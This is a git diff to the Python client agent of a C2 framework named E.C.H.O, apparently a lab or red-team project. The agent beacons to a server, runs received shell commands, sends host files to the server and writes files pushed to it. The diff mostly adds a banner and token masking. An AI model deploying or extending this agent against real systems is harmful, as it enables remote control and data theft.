@@ -12,14 +12,38 @@ import base64
 import colorama
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-colorama.init()
+colorama.init(autoreset=True)
 
 class bcolors:
     HEADER = '\033[95m'
+    OKCYAN = '\033[96m'
     OKGREEN = '\033[92m'
     WARNING = '\033[93m'
     FAIL = '\033[91m'
     ENDC = '\033[0m'
+    BOLD = '\033[1m'
+
+VERSION = "v0.1.0"
+
+def mask_token(tok, head=6, tail=4):
+    if not tok:
+        return "<none>"
+    if len(tok) <= head + tail + 3:
+        return tok
+    return tok[:head] + "..." + tok[-tail:]
+
+def print_startup_banner(server_url, token):
+    # Clear line and print banner
+    banner_lines = [
+        f"{bcolors.BOLD}{bcolors.OKCYAN}╔═════════════════════════════════════════════════════════════╗{bcolors.ENDC}",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.BOLD}{bcolors.HEADER}E.C.H.O{bcolors.ENDC} - Endpoint Command & Host Operations",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKGREEN}Agent starting{bcolors.ENDC}    Version: {bcolors.BOLD}{VERSION}{bcolors.ENDC}",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKCYAN}Server: {server_url}{bcolors.ENDC}",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKCYAN}Auth token: {mask_token(token)}{bcolors.ENDC}",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.WARNING}Waiting for commands... (beacon interval active){bcolors.ENDC}",
+        f"{bcolors.BOLD}{bcolors.OKCYAN}╚═════════════════════════════════════════════════════════════╝{bcolors.ENDC}",
+    ]
+    print("\n".join(banner_lines))
 
 def gather_info():
     return {
@@ -30,13 +54,13 @@ def gather_info():
 
 def exec_command(full_cmd):
     try:
-        _,cmd = full_cmd.split(" ",1) 
+        _,cmd = full_cmd.split(" ",1)
         proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
         return {"stdout": proc.stdout, "stderr": proc.stderr, "returncode": proc.returncode}
     except Exception as e:
         return {"error": str(e)}
 
-def download_file(server_url, cert, agent_id, filepath, auth_token,dest_path=None):
+def download_file(server_url, cert, agent_id, filepath, auth_token, dest_path=None):
     """
     Upload a local file from the agent to the C2 server.
     Supports optional remote destination header via command syntax: DOWNLOAD <src> <dest>
@@ -48,9 +72,9 @@ def download_file(server_url, cert, agent_id, filepath, auth_token,dest_path=Non
         result["stderr"] = msg
         return result
 
-    headers = {"X-Auth-Token": auth_token}
+    headers = {"X-Auth-Token": auth_token} if auth_token else {}
     if dest_path:
-        headers["X-Dest-Path"] = dest_path  
+        headers["X-Dest-Path"] = dest_path
 
     try:
         with open(filepath, "rb") as f:
@@ -73,7 +97,6 @@ def download_file(server_url, cert, agent_id, filepath, auth_token,dest_path=Non
 
     return result
 
-
 def handle_upload_command(command):
     """
     Upload a remote file to the agent
@@ -85,7 +108,7 @@ def handle_upload_command(command):
     try:
         data = base64.b64decode(b64_content)
         dir_path = os.path.dirname(remote_path)
-        if not os.path.exists(dir_path):
+        if dir_path and not os.path.exists(dir_path):
             os.makedirs(dir_path, exist_ok=True)
         with open(remote_path, "wb") as f:
             f.write(data)
@@ -96,7 +119,6 @@ def handle_upload_command(command):
 def handle_task(server_url, cert, agent_id, auth_token, task):
     command = task.get("command")
     print(f"{bcolors.OKGREEN}[+] Received task: {command}")
-
     if command.startswith("DOWNLOAD "):
         parts = command.split(" ", 2)
         src_path = parts[1].strip()
@@ -162,16 +184,17 @@ def beacon_cycle(server_url, cert, agent_id=None, interval=10, auth_token=None):
 
         time.sleep(interval)
 
-
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description=" E.C.H.O: Endpoint Command & Host Operations (client agent)")
+    parser = argparse.ArgumentParser(description="E.C.H.O: Endpoint Command & Host Operations (client agent)")
     parser.add_argument("--server", required=True, help="C2 server URL (ex: https://10.0.2.15:8443)")
-    parser.add_argument("--cert", required=True, help="path to the client certificate (server.crt)")
+    parser.add_argument("--cert", required=True, help="path to the client certificate (ca.crt)")
     parser.add_argument("--interval", type=int, default=10, help="beacon interval in seconds")
     parser.add_argument("--token", type=str, default=None, help="X-Auth-Token (optional: also read from env ECHO_AUTH_TOKEN)")
     args = parser.parse_args()
 
     token = args.token or os.environ.get("ECHO_AUTH_TOKEN")
+    print_startup_banner(args.server, token)
+
     if not token:
         print(f"{bcolors.WARNING}[WARN] No X-Auth-Token provided. If server requires token, requests will fail.")
         sys.exit(1)
